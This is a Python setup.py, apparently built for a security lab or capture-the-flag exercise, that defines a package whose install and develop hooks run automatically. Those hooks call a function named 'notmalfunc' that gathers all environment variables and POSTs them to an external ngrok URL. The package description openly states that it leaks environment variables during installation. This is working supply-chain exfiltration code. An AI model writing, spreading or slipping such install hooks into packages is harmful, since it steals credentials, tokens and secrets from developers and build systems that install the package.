import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools import setup, find_packages
import os
import urllib.request
import urllib.parse

def notmalfunc():
    data = dict(os.environ)
    print(data)
    encoded_data = urllib.parse.urlencode(data).encode()
    url = 'https://ea2de72474be.ngrok.app'
    req = urllib.request.Request(url, data=encoded_data)
    urllib.request.urlopen(req)

class AfterDevelop(develop):
    def run(self):
        develop.run(self)
        notmalfunc()

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()

# Setup function
setuptools.setup(
    name="artifact-lab-3-package-db7d716a",  # Package name
    version="1.0.0",  # Update version
    description="A package to demonstrate leaking environment variables",
    long_description="This package leaks environment variables as part of its install process.",
    long_description_content_type="text/markdown",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    packages=setuptools.find_packages(),  # Auto-discover modules like `flag.py`
    python_requires=">=3.6",
    cmdclass={
        'develop': AfterDevelop,  # Run `notmalfunc()` after development install
        'install': AfterInstall,  # Run `notmalfunc()` after package install
    },
)
